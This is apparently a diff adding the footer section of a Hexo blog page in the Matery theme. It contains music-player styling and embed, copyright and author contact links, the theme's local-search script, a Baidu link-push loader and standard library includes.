+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2023</span>
+            
+            <a href="/about" target="_blank">晓莎K</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/0x00xiaoshaK" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">219.7k</span>
+            
+            
+            
+            
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/0x00xiaoshaK" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1003682630@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1003682630" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1003682630" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
